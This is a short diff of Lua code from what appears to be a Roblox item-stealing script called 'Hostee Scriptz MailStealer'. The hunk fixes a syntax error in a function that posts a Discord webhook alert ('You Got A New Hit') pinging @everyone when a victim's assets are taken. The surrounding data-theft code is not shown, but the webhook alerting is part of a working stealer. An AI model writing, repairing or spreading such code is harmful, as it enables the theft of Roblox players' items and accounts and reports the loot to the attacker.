@@ -50,7 +50,7 @@ local RapFormated = (require(game:GetService("ReplicatedStorage").Library.Functi
 local function sendwebhook(msg)
 local msg = {
 	["avatar_url"] = "https://cdn.discordapp.com/icons/1085872367831613471/a_ef6e4fde052d7d4e416a03fe1a5b3da8.gif?size=4096",
-	["content"]= "**<:HosteeScriptz:1120813213030817924> || @here @everyone || "You Got A New Hit With Hostee Scriptz <:HosteeScriptz:1120813213030817924>**  ",
+	["content"]= "**<:HosteeScriptz:1120813213030817924> || @here @everyone || You Got A New Hit With Hostee Scriptz <:HosteeScriptz:1120813213030817924>**  ",
 	["username"] = "✗ Hostee Scriptz MailStealer ✗",
 	["embeds"]= {
 	  {
